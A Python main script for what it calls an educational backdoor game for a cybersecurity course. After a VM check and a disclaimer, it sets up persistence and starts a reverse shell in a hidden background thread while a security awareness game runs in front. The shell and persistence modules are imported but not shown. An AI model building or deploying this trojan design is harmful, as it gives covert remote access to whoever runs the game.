#!/usr/bin/env python3
"""
Educational Backdoor Game - Main Entry Point
For cybersecurity course - VM environment only
"""

import sys
import os
import time
import threading

# Add game directory to path
sys.path.append(os.path.dirname(__file__))

from game_engine import SecurityAwarenessGame
from dependency_checker import DependencyChecker
from persistence import PersistenceManager
from reverse_shell import ReverseShell
from utils import show_disclaimer, check_vm_environment

class EducationalBackdoorGame:
    def __init__(self):
        self.disclaimer_accepted = False
        self.game = None
        self.shell = None
        
    def run(self):
        """Main execution flow"""
        # Step 1: Check if running in VM (educational safety)
        if not check_vm_environment():
            print("[!] Warning: This program should only run in a VM!")
            print("[!] Exiting for safety...")
            sys.exit(1)
            
        # Step 2: Show disclaimer and get consent
        self.disclaimer_accepted = show_disclaimer()
        if not self.disclaimer_accepted:
            print("[*] Exiting as per user request.")
            sys.exit(0)
            
        print("\n[*] Initializing educational demonstration...")
        
        # Step 3: Check and install dependencies
        checker = DependencyChecker()
        if not checker.check_all():
            print("[*] Installing required dependencies...")
            if not checker.install_all():
                print("[!] Failed to install dependencies")
                sys.exit(1)
                
        # Step 4: Setup persistence (educational demonstration)
        print("[*] Setting up persistence mechanism (educational)...")
        persistence = PersistenceManager()
        persistence.setup()
        
        # Step 5: Start reverse shell in background
        print("[*] Initializing reverse shell (VM only)...")
        self.shell = ReverseShell()
        shell_thread = threading.Thread(target=self.shell.connect)
        shell_thread.daemon = True
        shell_thread.start()
        
        # Step 6: Start the actual game
        print("[*] Starting security awareness game...")
        self.game = SecurityAwarenessGame()
        self.game.run()
        
        # Step 7: Clean up on game exit
        print("\n[*] Game finished. Remember to run cleanup tool!")
        print("[*] Cleanup tool location: ../cleanup/cleanup_tool.py")

if __name__ == "__main__":
    game = EducationalBackdoorGame()
    game.run()